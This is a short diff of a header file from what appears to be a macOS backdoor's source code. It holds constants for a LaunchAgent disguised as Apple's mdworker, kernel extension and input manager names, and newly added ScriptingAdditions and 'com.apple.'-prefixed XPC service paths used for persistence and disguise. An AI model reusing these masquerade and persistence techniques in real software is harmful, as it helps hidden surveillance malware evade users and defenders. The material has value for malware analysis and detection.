@@ -122,7 +122,12 @@ typedef struct os_version {
 
 #define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
 #define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
- 
+
+#define OSAX_ROOT_PATH @"Library/ScriptingAdditions"
+
+#define XPC_BUNDLE_FOLDER_PREFIX  @"com.apple."
+#define XPC_BUNDLE_FRAMEWORK_PATH @"/System/Library/Frameworks/Foundation.framework/XPCServices"
+
 #define LOG_PREFIX    @"LOGF"
 
 // unixEpoch - winEpoch stuff
@@ -446,6 +451,7 @@ extern NSString *gInputManagerName;
 extern NSString *gKext32Name;
 extern NSString *gKext64Name;
 extern NSString *gXPCName;
+extern NSString *gMyXPCName;
 
 #define CRISIS_STARTSTOP    (UInt32)0x2
 #define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
